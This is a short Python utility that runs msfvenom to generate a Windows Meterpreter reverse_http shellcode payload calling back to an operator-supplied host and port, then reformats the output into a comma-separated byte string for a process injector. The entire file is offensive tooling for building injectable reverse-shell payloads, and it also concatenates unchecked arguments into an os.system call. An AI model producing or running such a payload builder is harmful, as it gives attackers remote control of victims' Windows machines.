#!/usr/bin/python3 
import argparse 
import os 
import subprocess 
import sys

from time import sleep

def create_shellcode(lhost, lport, payload, file): 
    """
    msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=443 -f c EXITFUNC=thread --var-name=MY_Data
    """
    build_payload = "-p {} ".format(payload)
    build_lhost = "LHOST={} ".format(lhost)
    build_lport = "LPORT={} ".format(lport)
    build_format = "--format c " 
    build_exit = "EXITFUNC=thread "
    build_output = "-o {}".format(file)

    gen_shellcode = os.system("msfvenom " +
                              build_payload +
                              build_lhost +
                              build_lport +
                              build_format +
                              build_exit +
                              build_output)
    
    if gen_shellcode == 0:

        print("\r\n[+] Command executed successfully.")
        return 0
    else:

        print("\r\n[!] Command failed with return code", gen_shellcode)
        return 1


def manipulate(file):
    with open(file, "r+") as fp:
        read_in = fp.readlines()
        #get rid of the first element which is just the variable name
        read_in = read_in[1:]
        new_shellcode = []
        #get rid of all the \n at the end of each element
        for i in read_in:
            new_shellcode.append(i.strip('\n'))
        final_shellcode = []
        #replace the \\x with ,0x which is what the process injector expects
        for i in new_shellcode:
            new_format = i.replace('\\x', ",0x")
            final_shellcode.append(new_format)
        new_shellcode = []
        #drop the "" in each list element
        for i in final_shellcode:
            new_format = i.replace('"', '')
            new_shellcode.append(new_format)
        #drop the leading , from the first element in the list, want to keep all others
        new_shellcode[0] = new_shellcode[0].replace(',', '', 1)
        print(''.join(new_shellcode))
        final_shellcode = ''.join(new_shellcode)
        return final_shellcode
                
if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-l",
        "--lhost",
        action="store",
        dest="lhost",
        help="The local host to connect back to (opsstation)",
    )
    parser.add_argument(
        "-p",
        "--lport",
        action="store",
        dest="lport",
        help="The local port to connect back to (your opsstation port)",
    )
    parser.add_argument(
        "-P",
        "--payload",
        action="store",
        dest="payload",
        help="The msfvenom compatable payload to use (windows/x64/meterpreter/reverse_http)",
    )
    parser.add_argument(
        "-f",
        "--file",
        action="store",
        dest="file",
        help="The output file to write your completed shellcode to"
    )

    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        print("To see help menu:\r\npython3 fix_shellcode.py -h")
        sys.exit(1)

    create_shellcode(args.lhost, args.lport, args.payload, args.file)
    sleep(5)
    manipulate(args.file)


